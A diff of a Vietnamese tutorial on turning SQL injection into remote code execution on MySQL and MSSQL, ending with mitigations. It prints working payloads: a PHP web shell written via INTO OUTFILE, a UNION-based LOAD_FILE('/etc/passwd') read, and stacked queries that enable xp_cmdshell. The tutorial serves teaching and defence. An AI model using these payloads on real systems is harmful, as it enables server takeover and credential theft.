@@ -6,27 +6,27 @@
 
 Nhưng khác với các kỹ thuật khai thác còn lại chỉ có thể đọc được dữ liệu ở trong database , kỹ thuật này nó còn có thể chiếm quyền điều khiển máy chủ , thực hiện ghi File và thực thi lệnh trực tiếp 
 
-# 2.Cơ chế 
+# 2. Kỹ thuật và điều kiện để khai thác 
 
-Ở trong MySQL , chúng ta có thể sử dụng lệnh này để xuất kết quả ra một file
+Ở đây chúng ta cần 3 điều kiến chính đó chính là 
+
+- khi quyền kết nối web app với database phải là `root` hoặc `sa` chứ không được là `user`
+- Cho phép thực thi nhiều câu lệnh đối với MSSQL , còn MYSQL không cần điều kiện này
+- Điều kiện cuối là , đối với MYSQL thì biến `secure_file_priv` phải là rỗng để có thể cho phép đọc file , ghi file trực tiếp vào ổ cứng hệ thống . Đối với MSSQL thì cái file thư viện `xplog70.dll` nó không được xóa , bởi vì đó là cái thư viện hỗ trợ cho chức năng sử dụng các câu lệnh cmd dành cho SQL 
+
+# 2.0 Sử dụng hàm LOAD_FILE() ĐỐI VỚI MYSQL
+
+Ví dụ cho các bạn dễ hình dung ra thì hàm này nó có có thể đọc các file trong cả hệ thống miễn là tài khoản kết nối tới database có quyền đọc file đó và cấu hình của database cho phép
 ```sql
-SELECT ... INTO OUTFILE ...
+SELECT LOAD_FILE('Đường_dẫn_tới_file');
 ```
-Giả sử chúng ta truyền vào
-```sql
-SELECT "<?php system($_GET['cmd']"; ?>" INTO OUT FILE 'var/www/html/shell.php'
+Giả sử khi chúng ta SQL Injection URL thế này 
 ```
-Kết quả: Sau khi tạo file shell.php , chỉ cần truy cập vào đường dẫn `http://test.com/shell.php?cmd=whoami` để thực thi lệnh trên Server 
-
-Có một hàm khác trong MySQL có chức năng đọc file hệ thống nữa là hàm `LOAD_FILE()` . Bạn cũng có thể sử dụng
-```sql
-SELECT LOAD_FILE('/etc/passwd')
+http://shop.com/index.php?id=10000 UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3 --
 ```
-Để đọc các file cấu hình của hệ thống 
+Thì thứ hiện ra  không phải là thông tin sản phẩm nữa mà chính là thông tin file cấu hình của hệ thống
 
-Giờ vào cái chính 
-
-# 3. Điều kiện để SQLi to RCE
+# 2.1. SỬ DỤNG INTO OUTFILE ĐỐI VỚI MYSQL 
 
 Thứ nhất là quyền `root` hoặc `sa`. Giải thích dễ hiểu thì các bạn cứ hiểu thế này . Giả sử trong backend sẽ có đoạn này
 ```sql
@@ -53,7 +53,84 @@ Chúng ta sẽ không thể chèn file `shell.php` kia vào trong thư mục `va
 
 Đấy là đối với hệ quản trị cơ sở dữ liệu MySQL . 
 
-Còn đối với MSSQL , thì sau khi có root thì các file `.dll` vốn thư viện hỗ trợ các chức năng thực hiện các câu lệnh CMD kia không được xóa đi 
+# 2.2. SỬ DỤNG XP_CMDSHELL ĐỐI VỚI MSSQL 
 
+Đối với hệ quản trị cơ sở dữ liệu MSSQL , thì lệnh để thực thi RCE nó sẽ là 
+
+```
+EXEC xp_cmdshell 'cmd'
+```
+Chúng ta không thể sử dụng UNION SELECT EXEC xp_cmdshell như thế được . Vì thể chúng ta cần phải sử dụng dấu chấm phẩy `;` để có thể thực thi nhiều câu truy vấn cùng một lúc
+
+Nhưng vấn đề là chúng ta cần backend nó cho phép gửi nhiều câu truy vấn cùng một lúc 
+
+
+Giải thích một số lệnh cơ bản
+```
+EXEC: viết tắt(exacute): chức năng chạy chương trình 
+DELACRE: khai báo biến 
+SET: nó giống như gán ( sau khi khai báo biến bằng DELACRE thì chúng ta phải dùng SET để gán)
+```
+
+quy trình để RCE thực tế trên MSSQL
+
+Bật mode cấu hình nâng cao để chỉnh sửa các tính năng ẩn 
+```sql
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+```
+Bật xp_cmdshell
+```sql
+EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
+```
+Thực thi lệnh RCE . Bây giờ chạy bất kì lệnh cmd nào
+```sql
+EXEC xp_cmdshell 'whoami';
+```
+
+Giả sử ,bạn có một website `shop.com`
+
+Với chức năng lấy thông tin sản phẩm bằng tham số id . Câu truy vấn thực hiện
+```sql
+SELECT * FROM products WHERE id = 1
+```
+Nhưng nếu chúng ta không nhập vào tham số id là 1 mà nhập vào là
+```sql
+1; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE; EXEC xp_cmdshell 'whoami';
+```
+Bởi vì web cho thực hiện việc gửi nhiều truy vấn một lúc , cho nên khi vào trong DATABASE thì thực tế sẽ là
+```sql
+SELECT * FROM products WHERE id =1;
+EXEC sp_configure 'show advanced options',1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
+EXEC xp_cmdshell 'whoami';
+```
+Kết quả khi đến dòng whoami kia thì tự động bật chương trình `cmd.exe` kia lên vào thực thi lệnh whoami . Kết quả nhận được thì SQL sẽ đưa vào một bảng riêng và trả về Client 
+
+# 2.3. Nạp lại file xplog70.dll đối với MSSQL
+
+Như đã nói trên thì muốn thực hiện SQLi to RCE thì bắt buộc phải dùng tới xp_cmdshell đối với MSSQL , nhưng 
+
+Khi mà file `xplog70.dll` bị xóa đi thì lệnh xp_cmdshell cũng trở nên vô tác dụng , bởi vì thư viện hỗ trợ nó đã bị xóa đi rồi mà
+
+Giải pháp ở đây chúng ta có thể tự tạo lại file đó rồi nạp lại cũng được mà trường hợp ở đây backend nó phải hỗ trợ thực thi nhiều lệnh một lúc và tài khoản kết nối tới SQL phải có quyền ghi File vào một thư mục trên hệ điều hành 
+
+Sau khi tạo lại đườ file `xplog70.dll` rồi thì chúng ta cần ghi file xuống ổ cứng . Ở đây thì chúng ta phải sử dụng OLE Automation . Nói dễ hiểu thì nó là một chức năng cho phép SQL Server điều khiển window của bạn , có thể tự động bật execl hoặc bật cmd lên này nọ ,... (các bạn tự tìm hiểu thêm về cái chức năng này thêm )
+
+Rồi tiếp tục khi đã nạp được file vào hệ thống rồi thì chúng ta sử dụng lại cái `xp_cmdshell` thôi
+
+
+# 3.Cách phòng chống 
+
+- Sử dụng Prepared Statement cho mọi truy vấn của Database . Không được nối chuỗi
+
+- Với người dùng thì web app chỉ được kết nối tới database với user thường , chỉ có quyền sử dụng `UNION`, `SELECT` , `UPDATE` ,...Tuyệt đối không được set là `root` hay `sa`
+
+- Tắt `xp_cmdshell`, `OLE_Autonmation`
+
+- Xóa các thư viện `.dll` nhạy cảm không dùng đến đối với MSSQL
+
+- Sử dụng WAF để chặn các từ khóa như UNION,SELECT,... nếu phát hiện nó trong input nhập vào
+
+- Set `secure_file_priv` = NULL bởi vì cái mode này chính là việc quyết định không cho đọc file(LOAD_FILE) hoặc ghi đề file vào trong ổ cứng
 
 
